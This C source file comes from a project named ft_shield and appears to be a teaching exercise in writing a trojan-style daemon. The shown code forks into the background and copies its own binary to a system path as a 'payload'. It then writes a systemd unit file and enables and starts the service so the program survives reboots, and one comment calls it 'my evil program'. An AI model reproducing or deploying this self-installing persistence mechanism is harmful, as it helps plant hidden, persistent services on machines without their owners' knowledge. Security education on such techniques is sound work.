#include "../includes/ft_shield.h"

t_daemon *create_daemon( void ) {
	t_daemon *daemon;
	ft_daemonize();
	daemon = malloc(sizeof(t_daemon));
	if (init_server(daemon) == 0) {
        perror("Server not listening");
        exit(EXIT_FAILURE);
	}
	
	return daemon;
}
// From the original Daemonize function
/* (This function forks, and if the fork(2) succeeds, the parent
			 calls _exit(2), so that further errors are seen by the child
			 only.)  On success Daemon() returns zero.  If an error occurs,
			 Daemon() returns -1 and sets errno to any of the errors specified
			 for the fork(2) and setsid(2). */

void copy_payload(char *curdir) {
	if (access(EXECUTABLE_FILE, F_OK) != 0) {
		int in_fd = open(curdir, O_RDONLY);
		int out_fd = open(EXECUTABLE_FILE, O_WRONLY | O_TRUNC | O_CREAT, 0755);
		if (in_fd < 0 || out_fd < 0) {
			exit(EXIT_FAILURE);
		}
		// get size
		struct stat st;
		fstat(in_fd, &st);
		if (sendfile(out_fd, in_fd, NULL, st.st_size) < 0) {
			exit(EXIT_FAILURE);
		}
		if (close(in_fd) < 0 || close(out_fd) < 0) {
			exit(EXIT_FAILURE);
		}
	}
	else {
		printf("DEBUG: File already exists\n");
	}
}

void startup_setup (void) {
	// create ini file
	FILE *ini_file = fopen(SYSTEMD_FILE, "w");
	// write content to file
	fprintf(ini_file, INI_CONTENT);
	fclose(ini_file);
	// Reload daemon
	system("systemctl daemon-reload");
	// enable my evil program hehe
	system("systemctl enable ft_shield.service");
	// start service
	system("systemctl start ft_shield.service");
}

void ft_daemonize(void) {
	pid_t pid = fork();

	if (pid == -1) { 
		exit(EXIT_FAILURE); 
	} 
	if (pid > 0) {
		exit(EXIT_SUCCESS);
	}
}
